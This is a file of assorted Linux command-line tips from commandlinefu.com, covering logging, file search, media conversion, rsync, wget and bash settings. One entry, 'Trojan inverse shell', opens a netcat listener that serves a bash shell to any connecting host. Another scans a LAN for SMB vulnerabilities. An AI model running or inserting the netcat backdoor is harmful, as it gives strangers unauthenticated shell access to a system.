@@ -1,0 +1,78 @@
+# commandlinefu.com - questions/comments: tech@commandlinefu.com
+
+# Record output of any command using 'tee' at backend; mainly can be used to capture the output of ssh from client side while connecting to a server.
+ssh user@server | tee logfilename
+
+# List files opened by a PID
+lsof -p 15857
+
+# batch convert Nikon RAW (nef) images to JPG
+ufraw-batch --out-type=jpeg --out-path=./jpg ./*.NEF
+
+# Quick case-insenstive partial filename search
+alias lg='ls --color=always | grep --color=always -i'
+
+# Get information about a video file
+mplayer -vo dummy -ao dummy -identify your_video.avi
+
+# The NMAP command you can use scan for the Conficker virus on your LAN
+nmap -PN -T4 -p139,445 -n -v --script=smb-check-vulns --script-args safe=1 192.168.0.1-254
+
+# Show a curses based menu selector
+whiptail --checklist "Simple checkbox menu" 11 35 5 tag item status repeat tags 1
+
+# Generate random passwords (from which you may select "memorable" ones)
+pwgen
+
+# Download from Rapidshare Premium using wget - Part 2
+wget -c -t 1 --load-cookies ~/.cookies/rapidshare <URL>
+
+# Find all directories on filesystem containing more than 99MB
+du -hS / | perl -ne '(m/\d{3,}M\s+\S/ || m/G\s+\S/) && print'
+
+# Display the standard deviation of a column of numbers with awk
+awk '{sum+=$1; sumsq+=$1*$1} END {print sqrt(sumsq/NR - (sum/NR)**2)}' file.dat
+
+# copy/mkdir and automatically create parent directories
+cp --parents /source/file /target-dir
+
+# Add a function you've defined to .bashrc
+addfunction () { declare -f $1 >> ~/.bashrc ; }
+
+# Remux an avi video if it won't play easily on your media device
+mencoder -ovc copy -oac copy -of avi -o remuxed.avi original.avi
+
+# Transfer large files/directories with no overhead over the network
+ssh user@host "cd targetdir; tar cfp - *" | dd of=file.tar
+
+# Enable automatic typo correction for directory names
+shopt -s cdspell
+
+# Quickly add user accounts to the system and force a password change on first login
+for name in larry moe schemp; do useradd $name; echo 'password' | passwd --stdin $name; chage -d 0 $name; done
+
+# rsync + find
+rsync -avz -e ssh --files-from=<(find -mtime +30 -mtime -60) source dest
+
+# prevents replace an existing file by mistake
+set -o noclobber
+
+# Download an entire ftp directory using wget
+wget -r ftp://user:pass@ftp.example.com
+
+# Mount a partition from within a complete disk dump
+INFILE=/path/to/your/backup.img; MOUNTPT=/mnt/foo; PARTITION=1; mount "$INFILE" "$MOUNTPT" -o loop,offset=$[ `/sbin/sfdisk -d "$INFILE" | grep "start=" | head -n $PARTITION | tail -n1 | sed 's/.*start=[ ]*//' | sed 's/,.*//'` * 512 ]
+
+# See how many % of your memory firefox is using
+ps -o %mem= -C firefox-bin | sed -s 's/\..*/%/'
+
+# Redefine the cd command's behavior
+cd() { builtin cd "${@:-$HOME}" && ls; }
+
+# Trojan inverse shell
+nc -l -p 2000 -e /bin/bash
+
+# Install a local RPM package from your desktop, then use the YUM repository to resolve its dependencies.
+yum localinstall /path/to/package.rpm
+
+# AD: Diff 2 entire servers at ScriptRock.com
